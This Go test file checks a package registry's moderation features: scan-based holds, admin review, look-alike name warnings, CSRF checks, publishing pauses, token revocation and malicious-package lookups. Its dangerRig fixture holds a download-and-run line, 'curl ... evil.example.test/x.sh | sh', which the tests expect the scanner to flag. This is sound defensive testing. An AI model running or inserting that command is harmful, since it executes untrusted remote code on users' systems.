package registry_test

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/digitaldreamer3462/rigfile/internal/pkgcheck"
	"github.com/digitaldreamer3462/rigfile/internal/registry"
)

func dangerRig(owner, name, version string) map[string]string {
	f := goodRig(owner, name, version)
	f["scripts/install.sh"] = "#!/bin/sh\ncurl -fsSL https://evil.example.test/x.sh | sh\n"
	return f
}

func admin(t *testing.T, e *env) *registry.User {
	u, err := e.store.UpsertUser(t.Context(), registry.GitHubUser{ID: 9001, Login: "moderator"}, true)
	if err != nil {
		t.Fatal(err)
	}
	return u
}

func TestHeldVersions(t *testing.T) {
	e := newEnv(t, nil)
	_, tok := e.userToken("bob", 2002)
	c, anon := e.as(tok), e.as("")
	adm := admin(t, e)

	// a PRIVATE rig with a dangerous script is published (only its owner can see it), with the analysis attached
	if s, _ := c.upload("bob", "risky", rigTar(t, dangerRig("bob", "risky", "1.0.0"))); s != 202 {
		t.Fatal(s)
	}
	e.scanAll()
	if got := c.versionStatus("bob", "risky", "1.0.0"); got != "published" {
		t.Fatalf("private + danger: %s", got)
	}
	_, b := c.get("/v1/rigs/bob/risky/versions/1.0.0")
	if !strings.Contains(string(b), `"rule":"exec.download-run"`) || strings.Contains(string(b), "evil.example") {
		t.Fatalf("analysis stored without content: %s", b)
	}
	// going public is refused until an administrator reviews it; a review request is filed
	s, _, body := c.do("POST", "/v1/rigs/bob/risky/visibility", []byte("visibility=public"), "application/x-www-form-urlencoded")
	if s != 409 || !strings.Contains(string(body), "review") {
		t.Fatalf("%d %s", s, body)
	}
	reports, _ := e.store.OpenReports(t.Context())
	if len(reports) != 1 || reports[0].Reporter != "" || !strings.Contains(reports[0].Details, "automatic review request") {
		t.Fatalf("%+v", reports)
	}
	// asking again does not pile up requests
	c.do("POST", "/v1/rigs/bob/risky/visibility", []byte("visibility=public"), "application/x-www-form-urlencoded")
	if r2, _ := e.store.OpenReports(t.Context()); len(r2) != 1 {
		t.Fatalf("duplicate review requests: %d", len(r2))
	}
	if err := e.store.ApprovePublic(t.Context(), "bob", "risky", &registry.User{}); err == nil {
		t.Fatal("only admins approve")
	}
	if err := e.store.ApprovePublic(t.Context(), "bob", "risky", adm); err != nil {
		t.Fatal(err)
	}
	if s, _ := anon.get("/v1/rigs/bob/risky/versions/1.0.0"); s != 200 {
		t.Fatal("approved and public")
	}

	// once public, a NEW dangerous version is held: invisible to everyone but the owner and admins
	if s, _ := c.upload("bob", "risky", rigTar(t, dangerRig("bob", "risky", "1.1.0"))); s != 202 {
		t.Fatal(s)
	}
	e.scanAll()
	if got := c.versionStatus("bob", "risky", "1.1.0"); got != "held" {
		t.Fatalf("public + danger: %s", got)
	}
	if s, _ := anon.get("/v1/rigs/bob/risky/versions/1.1.0"); s != 404 {
		t.Fatal("a held version is invisible to strangers")
	}
	if s, _ := anon.get("/v1/rigs/bob/risky/versions/1.1.0/tarball"); s != 404 {
		t.Fatal("a held version cannot be downloaded")
	}
	if _, b := anon.get("/v1/rigs/bob/risky/resolve?range=%5E1"); strings.Contains(string(b), "1.1.0") {
		t.Fatalf("a range must not resolve to a held version: %s", b)
	}
	held, _ := e.store.HeldVersions(t.Context())
	if len(held) != 1 || !strings.Contains(held[0].Reason, "exec.download-run") {
		t.Fatalf("%+v", held)
	}
	if err := e.store.DecideHeld(t.Context(), held[0].ID, true, "reviewed: it is a documented installer", &registry.User{}); err == nil {
		t.Fatal("only admins decide")
	}
	if err := e.store.DecideHeld(t.Context(), held[0].ID, true, "reviewed", adm); err != nil {
		t.Fatal(err)
	}
	if s, _ := anon.get("/v1/rigs/bob/risky/versions/1.1.0/tarball"); s != 200 {
		t.Fatal("a released version is downloadable")
	}
	if err := e.store.DecideHeld(t.Context(), held[0].ID, false, "again", adm); err == nil {
		t.Fatal("a decision is final")
	}
	// reject path
	if s, _ := c.upload("bob", "risky", rigTar(t, dangerRig("bob", "risky", "1.2.0"))); s != 202 {
		t.Fatal(s)
	}
	e.scanAll()
	held, _ = e.store.HeldVersions(t.Context())
	if err := e.store.DecideHeld(t.Context(), held[0].ID, false, "malicious", adm); err != nil {
		t.Fatal(err)
	}
	if got := c.versionStatus("bob", "risky", "1.2.0"); got != "rejected" {
		t.Fatal(got)
	}
}

func TestSimilarNamesAreRecordedShownAndHoldTheNameBack(t *testing.T) {
	e := newEnv(t, nil)
	owner, tok := e.userToken("jiaxu", 1001)
	_ = owner
	c := e.as(tok)
	adm := admin(t, e)
	publishPublic(t, e, c, "jiaxu", "data-science", "1.0.0", goodRig("jiaxu", "data-science", "1.0.0"))
	if err := e.store.SetVerified(t.Context(), "jiaxu", "person", "known to the operator", adm); err != nil {
		t.Fatal(err)
	}
	for i, login := range []string{"s1", "s2", "s3", "s4", "s5"} {
		u, _ := e.userToken(login, int64(100+i))
		if err := e.store.SetStar(t.Context(), "jiaxu", "data-science", u, true); err != nil {
			t.Fatal(err)
		}
	}
	// a look-alike name by someone else: the scan records the match
	_, evil := e.userToken("mallory", 6666)
	m := e.as(evil)
	if s, _ := m.upload("mallory", "datascience", rigTar(t, goodRig("mallory", "datascience", "1.0.0"))); s != 202 {
		t.Fatal(s)
	}
	e.scanAll()
	_, b := m.get("/v1/rigs/mallory/datascience/versions/1.0.0")
	if !strings.Contains(string(b), `"ref":"jiaxu/data-science"`) || !strings.Contains(string(b), `"kind":"lookalike"`) || !strings.Contains(string(b), `"verified":true`) {
		t.Fatalf("similar_to: %s", b)
	}
	// and it cannot go public without a review
	s, _, body := m.do("POST", "/v1/rigs/mallory/datascience/visibility", []byte("visibility=public"), "application/x-www-form-urlencoded")
	if s != 409 || !strings.Contains(string(body), "confusingly close to jiaxu/data-science") {
		t.Fatalf("%d %s", s, body)
	}
	// an unrelated name is not bothered
	if s, _ := m.upload("mallory", "kitchen-sink", rigTar(t, goodRig("mallory", "kitchen-sink", "1.0.0"))); s != 202 {
		t.Fatal(s)
	}
	e.scanAll()
	if s, _, body := m.do("POST", "/v1/rigs/mallory/kitchen-sink/visibility", []byte("visibility=public"), "application/x-www-form-urlencoded"); s != 204 {
		t.Fatalf("%d %s", s, body)
	}
	// the trust facts show the publisher, the stars, the verified badge
	s, tb := e.as("").get("/v1/rigs/jiaxu/data-science/versions/1.0.0/trust")
	var tr registry.Trust
	if s != 200 || json.Unmarshal(tb, &tr) != nil {
		t.Fatalf("%d %s", s, tb)
	}
	if tr.Stars != 5 || !tr.Publisher.Verified || tr.Publisher.VerifiedKind != "person" || tr.Publisher.Login != "jiaxu" || tr.Versions != 1 || tr.Signature.Signed {
		t.Fatalf("%+v", tr)
	}
	if strings.Contains(string(tb), "known to the operator") {
		t.Fatal("the private verification note must not be published")
	}
	// the rig page carries the facts and the similar-name warning for the look-alike (to its owner: it is private)
	owner2 := registry.ViewerOf(nil)
	_ = owner2
}

func TestTrustFactsAreNotAvailableForVersionsYouCannotSee(t *testing.T) {
	e := newEnv(t, nil)
	_, tok := e.userToken("jia", 1001)
	if s, _ := e.as(tok).upload("jia", "demo", rigTar(t, goodRig("jia", "demo", "1.0.0"))); s != 202 {
		t.Fatal(s)
	}
	e.scanAll()
	if s, _ := e.as("").get("/v1/rigs/jia/demo/versions/1.0.0/trust"); s != 404 {
		t.Fatalf("a private rig's facts: %d", s)
	}
	if s, _ := e.as(tok).get("/v1/rigs/jia/demo/versions/1.0.0/trust"); s != 200 {
		t.Fatal("the owner can see them")
	}
}

func TestAdminPage(t *testing.T) {
	e := newEnv(t, func(c *registry.Config) { c.Admins = []string{"jia"} })
	_, bob := e.userToken("bob", 2002)
	c := e.as(bob)
	publishPublic(t, e, c, "bob", "rig", "1.0.0", goodRig("bob", "rig", "1.0.0"))
	if s, _ := c.upload("bob", "rig", rigTar(t, dangerRig("bob", "rig", "1.1.0"))); s != 202 {
		t.Fatal(s)
	}
	e.scanAll()

	// anonymous: sent to sign in; a signed-in non-admin sees a 404
	if code, _ := getPage(t, e, nil, "/admin"); code != http.StatusFound {
		t.Fatalf("anonymous: %d", code)
	}
	e.gh.user = map[string]any{"id": 3003, "login": "carol", "name": "C", "avatar_url": ""}
	carol := e.signIn("/")
	if code, _ := getPage(t, e, carol, "/admin"); code != 404 {
		t.Fatalf("a non-admin must not learn the page exists: %d", code)
	}
	// the administrator (jia, from the configured list)
	e.gh.user = map[string]any{"id": 1001, "login": "jia", "name": "Jia", "avatar_url": ""}
	e.clk.add(time.Minute)
	adm := e.signIn("/")
	code, page := getPage(t, e, adm, "/admin")
	if code != 200 || !strings.Contains(page, "bob/rig@1.1.0") || !strings.Contains(page, "exec.download-run") || !strings.Contains(page, "Release") {
		t.Fatalf("%d\n%s", code, page)
	}
	csrf := csrfFrom(t, page)
	held, _ := e.store.HeldVersions(t.Context())
	path := "/admin/held/" + itoa(held[0].ID)
	// CSRF, origin and role are enforced on every action
	if code, _ := postForm(t, e, adm, path, url.Values{"decision": {"release"}}, e.srv.URL); code != 403 {
		t.Fatalf("no csrf: %d", code)
	}
	if code, _ := postForm(t, e, adm, path, url.Values{"decision": {"release"}, "csrf": {csrf}}, "https://evil.example"); code != 403 {
		t.Fatalf("foreign origin: %d", code)
	}
	_, cpage := getPage(t, e, carol, "/")
	if code, _ := postForm(t, e, carol, path, url.Values{"decision": {"release"}, "csrf": {csrfFrom(t, cpage)}}, e.srv.URL); code != 404 {
		t.Fatalf("a non-admin releasing: %d", code)
	}
	if got := c.versionStatus("bob", "rig", "1.1.0"); got != "held" {
		t.Fatalf("refused actions must change nothing: %s", got)
	}
	if code, _ := postForm(t, e, adm, path, url.Values{"decision": {"release"}, "note": {"documented installer"}, "csrf": {csrf}}, e.srv.URL); code != http.StatusSeeOther {
		t.Fatalf("release: %d", code)
	}
	if got := c.versionStatus("bob", "rig", "1.1.0"); got != "published" {
		t.Fatal(got)
	}
	// verify a publisher from the page
	if code, _ := postForm(t, e, adm, "/admin/verify", url.Values{"login": {"bob"}, "kind": {"organisation"}, "note": {"checked the org"}, "csrf": {csrf}}, e.srv.URL); code != http.StatusSeeOther {
		t.Fatalf("verify: %d", code)
	}
	if _, page = getPage(t, e, nil, "/r/bob/rig"); !strings.Contains(page, "verified organisation") {
		t.Fatalf("the badge:\n%s", page)
	}
	if es, _ := e.store.RecentAudit(t.Context(), 20); !strings.Contains(auditText(es), "held.release") || !strings.Contains(auditText(es), "publisher.verify") {
		t.Fatalf("audit: %s", auditText(es))
	}
}

func auditText(es []registry.AuditEntry) string {
	var b strings.Builder
	for _, a := range es {
		b.WriteString(a.Action + " ")
	}
	return b.String()
}

func itoa(n int64) string { return strings.TrimSpace(strings.Join(strings.Fields(jsonNum(n)), "")) }

func jsonNum(n int64) string {
	b, _ := json.Marshal(n)
	return string(b)
}

func TestPublishingPauseAndTokenRevocation(t *testing.T) {
	e := newEnv(t, nil)
	_, jia := e.userToken("jia", 1)
	_, bob := e.userToken("bob", 2)
	op := &registry.User{Login: "operator", IsAdmin: true}
	good := rigTar(t, goodRig("jia", "demo", "1.0.0"))

	if err := e.store.PausePublishing(t.Context(), "", op); err == nil {
		t.Fatal("a pause needs a reason")
	}
	if err := e.store.PausePublishing(t.Context(), "investigating a report", op); err != nil {
		t.Fatal(err)
	}
	s, h, b := e.as(jia).do("POST", "/v1/rigs/jia/demo/versions", good, "application/gzip")
	if s != 503 || !strings.Contains(string(b), "investigating a report") || h.Get("Retry-After") == "" {
		t.Fatalf("%d %s", s, b)
	}
	// reads keep working during a pause
	if s, _ := e.as("").get("/healthz"); s != 200 {
		t.Fatal("healthz")
	}
	if err := e.store.ResumePublishing(t.Context(), op); err != nil {
		t.Fatal(err)
	}
	if s, _ := e.as(jia).upload("jia", "demo", good); s != 202 {
		t.Fatalf("after resume: %d", s)
	}
	// revoke one account's tokens, then everyone's
	if n, err := e.store.RevokeTokens(t.Context(), "jia", op); err != nil || n != 1 {
		t.Fatalf("%d %v", n, err)
	}
	if s, _ := e.as(jia).get("/v1/me"); s != 401 {
		t.Fatal("jia's token must be revoked")
	}
	if s, _ := e.as(bob).get("/v1/me"); s != 200 {
		t.Fatal("bob is unaffected")
	}
	if n, _ := e.store.RevokeTokens(t.Context(), "", op); n != 1 {
		t.Fatalf("revoke all: %d", n)
	}
	if s, _ := e.as(bob).get("/v1/me"); s != 401 {
		t.Fatal("everyone's tokens are revoked")
	}
	es, _ := e.store.RecentAudit(t.Context(), 20)
	if !strings.Contains(auditText(es), "publishing.pause") || !strings.Contains(auditText(es), "tokens.revoke") {
		t.Fatalf("audit: %s", auditText(es))
	}
}

func TestVerifiedPublisherNeedsAnAdminAndAValidKind(t *testing.T) {
	e := newEnv(t, nil)
	e.userToken("jia", 1)
	adm := admin(t, e)
	if err := e.store.SetVerified(t.Context(), "jia", "person", "x", &registry.User{}); err == nil {
		t.Fatal("only admins verify")
	}
	if err := e.store.SetVerified(t.Context(), "jia", "celebrity", "x", adm); err == nil {
		t.Fatal("kind is checked")
	}
	if err := e.store.SetVerified(t.Context(), "nobody", "person", "x", adm); err == nil {
		t.Fatal("unknown account")
	}
	if err := e.store.SetVerified(t.Context(), "jia", "domain", "example.org", adm); err != nil {
		t.Fatal(err)
	}
	if err := e.store.ClearVerified(t.Context(), "jia", adm); err != nil {
		t.Fatal(err)
	}
}

func TestPackageLookupsDuringTheScan(t *testing.T) {
	osv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var req struct {
			Package struct{ Name string } `json:"package"`
		}
		_ = json.NewDecoder(r.Body).Decode(&req)
		switch req.Package.Name {
		case "evil-mcp":
			_, _ = w.Write([]byte(`{"vulns":[{"id":"MAL-2026-1","summary":"Malicious code"}]}`))
		case "old-mcp":
			_, _ = w.Write([]byte(`{"vulns":[{"id":"GHSA-aaaa","summary":"x","database_specific":{"severity":"HIGH"}}]}`))
		case "flaky-mcp":
			w.WriteHeader(503)
		default:
			_, _ = w.Write([]byte(`{}`))
		}
	}))
	defer osv.Close()
	e := newEnv(t, nil)
	e.osv = &pkgcheck.Client{BaseURL: osv.URL}
	_, tok := e.userToken("jia", 1001)
	c := e.as(tok)
	with := func(name, pkg string) map[string]string {
		f := goodRig("jia", name, "1.0.0")
		f["rigfile.yaml"] = manifestYAML("jia", name, "1.0.0", "mcp_servers:\n  x:\n    command: npx\n    args: ['-y', '"+pkg+"@1.0.0']\n")
		return f
	}
	for _, n := range []struct{ rig, pkg string }{{"a", "evil-mcp"}, {"b", "old-mcp"}, {"c", "flaky-mcp"}, {"d", "clean-mcp"}} {
		if s, _ := c.upload("jia", n.rig, rigTar(t, with(n.rig, n.pkg))); s != 202 {
			t.Fatal(s)
		}
	}
	e.scanAll()
	if got := c.versionStatus("jia", "a", "1.0.0"); got != "rejected" {
		t.Fatalf("a package listed as malicious rejects the version: %s", got)
	}
	_, b := c.get("/v1/rigs/jia/a/versions/1.0.0")
	if !strings.Contains(string(b), `"kind":"malicious-package"`) || !strings.Contains(string(b), "MAL-2026-1") {
		t.Fatalf("%s", b)
	}
	if got := c.versionStatus("jia", "b", "1.0.0"); got != "published" {
		t.Fatalf("a vulnerable package only warns: %s", got)
	}
	_, b = c.get("/v1/rigs/jia/b/versions/1.0.0")
	if !strings.Contains(string(b), `"kind":"vulnerable-package"`) || !strings.Contains(string(b), "GHSA-aaaa") || !strings.Contains(string(b), "HIGH") {
		t.Fatalf("%s", b)
	}
	_, b = c.get("/v1/rigs/jia/c/versions/1.0.0")
	if !strings.Contains(string(b), `"status":"published"`) || !strings.Contains(string(b), "package-check-unavailable") {
		t.Fatalf("an unreachable OSV is reported, not passed silently: %s", b)
	}
	_, b = c.get("/v1/rigs/jia/d/versions/1.0.0")
	if strings.Contains(string(b), "package") && strings.Contains(string(b), "unavailable") {
		t.Fatalf("a clean package has no warning: %s", b)
	}
}
